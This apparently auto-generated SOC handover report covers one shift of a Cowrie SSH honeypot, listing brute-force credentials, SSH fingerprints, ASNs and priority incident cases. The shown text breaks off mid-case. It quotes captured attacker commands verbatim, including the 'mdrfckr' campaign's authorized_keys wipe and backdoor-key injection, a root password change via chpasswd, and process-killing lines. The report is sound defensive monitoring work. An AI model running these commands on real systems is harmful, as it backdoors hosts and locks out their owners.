# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-23 |
| **Generated At** | 2026-05-23T06:37:33Z |
| **Shift Time** | 06:37 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **147** |
| Confirmed Threats | **109** |
| False Positives Filtered | **38** (25.9%) |
| Unique Attacker IPs | **37** |
| Countries of Origin | **15** |
| High Severity Cases | **26** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **121** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **62** |
| Unique Credential Pairs | **40** |
| Unique Usernames | **25** |
| Unique Passwords | **38** |
| Successful Auth Pairs | **20** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 26 |
| `345gs5662d34` | 12 |
| `deploy` | 2 |
| `aaa` | 1 |
| `toor` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 12 |
| `3245gs5662d34` | 12 |
| `123` | 2 |
| `admin` | 2 |
| `asd` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 12 |
| `root` | `3245gs5662d34` | 12 |
| `deploy` | `asd` | 1 |
| `root` | `Bb123456` | 1 |
| `aaa` | `123456` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Bb123456` | `118.186.208.20` | 2026-05-23T03:47:24 |
| `root` | `Aa123456789` | `103.158.40.65` | 2026-05-23T03:55:17 |
| `root` | `3245gs5662d34` | `103.158.40.65` | 2026-05-23T03:55:20 |
| `root` | `abc.123456` | `183.91.186.36` | 2026-05-23T04:08:41 |
| `root` | `3245gs5662d34` | `183.91.186.36` | 2026-05-23T04:08:44 |
| `root` | `5tgb^YHN` | `103.158.40.65` | 2026-05-23T04:09:15 |
| `root` | `1A2b3c4d` | `102.88.137.80` | 2026-05-23T04:10:08 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-05-23T04:10:15 |
| `root` | `xxx` | `103.158.40.65` | 2026-05-23T04:13:51 |
| `root` | `Zc123456!` | `102.88.137.80` | 2026-05-23T04:15:38 |
| `root` | `Abcd-1234` | `102.88.137.80` | 2026-05-23T04:21:14 |
| `root` | `101010` | `103.158.40.65` | 2026-05-23T04:23:08 |
| `root` | `654123` | `102.88.137.80` | 2026-05-23T04:26:42 |
| `root` | `Aaaa123456` | `102.88.137.213` | 2026-05-23T04:54:40 |
| `root` | `3245gs5662d34` | `102.88.137.213` | 2026-05-23T04:54:47 |
| `root` | `test#123` | `113.44.104.43` | 2026-05-23T05:12:24 |
| `root` | `3245gs5662d34` | `113.44.104.43` | 2026-05-23T05:12:28 |
| `root` | `admin` | `176.65.148.44` | 2026-05-23T05:12:39 |
| `root` | `@Pass123` | `102.210.148.92` | 2026-05-23T05:56:02 |
| `root` | `3245gs5662d34` | `102.210.148.92` | 2026-05-23T05:56:06 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **147** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 83 |
| Unknown | 1 |
| Go SSH scanner | 1 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 30 | 5 |
| `713bd9cc9355...` | Mirai/variant | 23 | 1 |
| `af8223ac9914...` | libssh-based | 16 | 1 |
| `03a80b21afa8...` | Modern SSH client | 10 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 30 | 5 | Mirai/variant |
| `713bd9cc9355...` | libssh | 23 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 16 | 1 | libssh-based |
| `03a80b21afa8...` | libssh | 10 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 3 | — |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `a289c065bf37...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `ec7378c1a92f...` | OpenSSH | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 12 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:yjULP7Y3rPSj"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `118.186.208.20`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.158.40.65`, `113.44.104.43`, `183.91.186.36`, `102.210.148.92`, `102.88.137.213`, `102.88.137.80`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **37** |
| Unique ASNs | **29** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS265509` | OPTOENLACES S.A. DE C.V. | 3 | LOW |
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS23724` | IDC, China Telecommunications Corporation | 2 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS29465` | MTN NIGERIA Communication limited | 2 | HIGH |
| `AS7545` | TPG Telecom Limited | 1 | MEDIUM |
| `AS8167` | V tal | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (26)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-060556df8ec2

| Field | Detail |
|---|---|
| **Source IP** | `118.186.208[.]20` |
| **First Seen** | 2026-05-23 03:47 |
| **Last Seen** | 2026-05-23 03:47 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:yjULP7Y3rPSj"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 03:47:23` | `cowrie.session.connect` |
| `2026-05-23 03:47:23` | `cowrie.client.version` |
| `2026-05-23 03:47:23` | `cowrie.client.kex` |
| `2026-05-23 03:47:24` | `cowrie.login.success` |
| `2026-05-23 03:47:24` | `cowrie.session.params` |
| `2026-05-23 03:47:24` | `cowrie.command.input` |
| `2026-05-23 03:47:24` | `cowrie.command.failed` |
| `2026-05-23 03:47:24` | `cowrie.log.closed` |
| `2026-05-23 03:47:25` | `cowrie.session.params` |
| `2026-05-23 03:47:25` | `cowrie.command.input` |
| `2026-05-23 03:47:25` | `cowrie.session.file_download` |
| `2026-05-23 03:47:25` | `cowrie.log.closed` |
| `2026-05-23 03:47:37` | `cowrie.session.params` |
| `2026-05-23 03:47:37` | `cowrie.command.input` |
| `2026-05-23 03:47:37` | `cowrie.log.closed` |
| `2026-05-23 03:47:37` | `cowrie.session.params` |
| `2026-05-23 03:47:37` | `cowrie.command.input` |
| `2026-05-23 03:47:38` | `cowrie.log.closed` |
| `2026-05-23 03:47:38` | `cowrie.session.params` |
| `2026-05-23 03:47:38` | `cowrie.command.input` |
| `2026-05-23 03:47:38` | `cowrie.session.file_download` |
| `2026-05-23 03:47:38` | `cowrie.log.closed` |
| `2026-05-23 03:47:38` | `cowrie.session.params` |
| `2026-05-23 03:47:38` | `cowrie.command.input` |
| `2026-05-23 03:47:38` | `cowrie.log.closed` |
| `2026-05-23 03:47:39` | `cowrie.session.params` |
| `2026-05-23 03:47:39` | `cowrie.command.input` |
| `2026-05-23 03:47:39` | `cowrie.log.closed` |
| `2026-05-23 03:47:39` | `cowrie.session.params` |
| `2026-05-23 03:47:39` | `cowrie.command.input` |
| `2026-05-23 03:47:39` | `cowrie.command.input` |
| `2026-05-23 03:47:40` | `cowrie.log.closed` |
| `2026-05-23 03:47:40` | `cowrie.session.params` |
| `2026-05-23 03:47:40` | `cowrie.command.input` |
| `2026-05-23 03:47:40` | `cowrie.log.closed` |
| `2026-05-23 03:47:40` | `cowrie.session.params` |
| `2026-05-23 03:47:40` | `cowrie.command.input` |
| `2026-05-23 03:47:41` | `cowrie.log.closed` |
| `2026-05-23 03:47:41` | `cowrie.session.params` |
| `2026-05-23 03:47:41` | `cowrie.command.input` |
| `2026-05-23 03:47:41` | `cowrie.log.closed` |
| `2026-05-23 03:47:41` | `cowrie.session.params` |
| `2026-05-23 03:47:41` | `cowrie.command.input` |
| `2026-05-23 03:47:42` | `cowrie.log.closed` |
| `2026-05-23 03:47:42` | `cowrie.session.params` |
| `2026-05-23 03:47:42` | `cowrie.command.input` |
| `2026-05-23 03:47:42` | `cowrie.log.closed` |
| `2026-05-23 03:47:42` | `cowrie.session.params` |
| `2026-05-23 03:47:42` | `cowrie.command.input` |
| `2026-05-23 03:47:42` | `cowrie.log.closed` |
| `2026-05-23 03:47:43` | `cowrie.session.params` |
| `2026-05-23 03:47:43` | `cowrie.command.input` |
| `2026-05-23 03:47:43` | `cowrie.log.closed` |
| `2026-05-23 03:47:43` | `cowrie.session.params` |
| `2026-05-23 03:47:43` | `cowrie.command.input` |
| `2026-05-23 03:47:44` | `cowrie.log.closed` |
| `2026-05-23 03:47:44` | `cowrie.session.params` |
| `2026-05-23 03:47:44` | `cowrie.command.input` |
| `2026-05-23 03:47:44` | `cowrie.log.closed` |
| `2026-05-23 03:47:44` | `cowrie.session.params` |
| `2026-05-23 03:47:44` | `cowrie.command.input` |
| `2026-05-23 03:47:45` | `cowrie.log.closed` |
| `2026-05-23 03:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.208[.]20` to AbuseIPDB if not already reported
- [ ] Block `118.186.208[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f43215373c4e

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-23 03:55 |
| **Last Seen** | 2026-05-23 03:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 03:55:17` | `cowrie.session.connect` |
| `2026-05-23 03:55:17` | `cowrie.client.version` |
| `2026-05-23 03:55:17` | `cowrie.client.kex` |
| `2026-05-23 03:55:17` | `cowrie.login.success` |
| `2026-05-23 03:55:17` | `cowrie.session.params` |
| `2026-05-23 03:55:17` | `cowrie.command.input` |
| `2026-05-23 03:55:17` | `cowrie.command.failed` |
| `2026-05-23 03:55:17` | `cowrie.log.closed` |
| `2026-05-23 03:55:18` | `cowrie.session.params` |
| `2026-05-23 03:55:18` | `cowrie.command.input` |
| `2026-05-23 03:55:18` | `cowrie.session.file_download` |
| `2026-05-23 03:55:18` | `cowrie.log.closed` |
| `2026-05-23 03:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f02c3d1ed9f

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-23 03:55 |
| **Last Seen** | 2026-05-23 03:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 03:55:19` | `cowrie.session.connect` |
| `2026-05-23 03:55:19` | `cowrie.client.version` |
| `2026-05-23 03:55:19` | `cowrie.client.kex` |
| `2026-05-23 03:55:20` | `cowrie.login.success` |
| `2026-05-23 03:55:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6502bac92a4

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-23 04:08 |
| **Last Seen** | 2026-05-23 04:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:08:40` | `cowrie.session.connect` |
| `2026-05-23 04:08:40` | `cowrie.client.version` |
| `2026-05-23 04:08:40` | `cowrie.client.kex` |
| `2026-05-23 04:08:41` | `cowrie.login.success` |
| `2026-05-23 04:08:41` | `cowrie.session.params` |
| `2026-05-23 04:08:41` | `cowrie.command.input` |
| `2026-05-23 04:08:41` | `cowrie.command.failed` |
| `2026-05-23 04:08:41` | `cowrie.log.closed` |
| `2026-05-23 04:08:41` | `cowrie.session.params` |
| `2026-05-23 04:08:41` | `cowrie.command.input` |
| `2026-05-23 04:08:41` | `cowrie.session.file_download` |
| `2026-05-23 04:08:41` | `cowrie.log.closed` |
| `2026-05-23 04:08:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-461b95370946

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-05-23 04:08 |
| **Last Seen** | 2026-05-23 04:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:08:43` | `cowrie.session.connect` |
| `2026-05-23 04:08:43` | `cowrie.client.version` |
| `2026-05-23 04:08:43` | `cowrie.client.kex` |
| `2026-05-23 04:08:44` | `cowrie.login.success` |
| `2026-05-23 04:08:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.91.186[.]36` to AbuseIPDB if not already reported
- [ ] Block `183.91.186[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85d55c80bad0

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-23 04:09 |
| **Last Seen** | 2026-05-23 04:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:09:15` | `cowrie.session.connect` |
| `2026-05-23 04:09:15` | `cowrie.client.version` |
| `2026-05-23 04:09:15` | `cowrie.client.kex` |
| `2026-05-23 04:09:15` | `cowrie.login.success` |
| `2026-05-23 04:09:15` | `cowrie.session.params` |
| `2026-05-23 04:09:15` | `cowrie.command.input` |
| `2026-05-23 04:09:15` | `cowrie.command.failed` |
| `2026-05-23 04:09:16` | `cowrie.log.closed` |
| `2026-05-23 04:09:16` | `cowrie.session.params` |
| `2026-05-23 04:09:16` | `cowrie.command.input` |
| `2026-05-23 04:09:16` | `cowrie.session.file_download` |
| `2026-05-23 04:09:16` | `cowrie.log.closed` |
| `2026-05-23 04:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d73c88b40fb8

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-23 04:09 |
| **Last Seen** | 2026-05-23 04:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:09:17` | `cowrie.session.connect` |
| `2026-05-23 04:09:17` | `cowrie.client.version` |
| `2026-05-23 04:09:17` | `cowrie.client.kex` |
| `2026-05-23 04:09:17` | `cowrie.login.success` |
| `2026-05-23 04:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.40[.]65` to AbuseIPDB if not already reported
- [ ] Block `103.158.40[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83fa4274b8a1

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-23 04:10 |
| **Last Seen** | 2026-05-23 04:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:10:06` | `cowrie.session.connect` |
| `2026-05-23 04:10:06` | `cowrie.client.version` |
| `2026-05-23 04:10:07` | `cowrie.client.kex` |
| `2026-05-23 04:10:08` | `cowrie.login.success` |
| `2026-05-23 04:10:09` | `cowrie.session.params` |
| `2026-05-23 04:10:09` | `cowrie.command.input` |
| `2026-05-23 04:10:09` | `cowrie.command.failed` |
| `2026-05-23 04:10:09` | `cowrie.log.closed` |
| `2026-05-23 04:10:10` | `cowrie.session.params` |
| `2026-05-23 04:10:10` | `cowrie.command.input` |
| `2026-05-23 04:10:10` | `cowrie.session.file_download` |
| `2026-05-23 04:10:10` | `cowrie.log.closed` |
| `2026-05-23 04:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-624fec2bb552

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-23 04:10 |
| **Last Seen** | 2026-05-23 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 04:10:13` | `cowrie.session.connect` |
| `2026-05-23 04:10:13` | `cowrie.client.version` |
| `2026-05-23 04:10:14` | `cowrie.client.kex` |
| `2026-05-23 04:10:15` | `cowrie.login.success` |
| `2026-05-23 04:10:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7a0c5a83cd7

| Field | Detail |
|---|---|
| **Source IP** | `103.158.40[.]65` |
| **First Seen** | 2026-05-23 04:13 |
| **Last Seen** | 2026-05-23 04:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
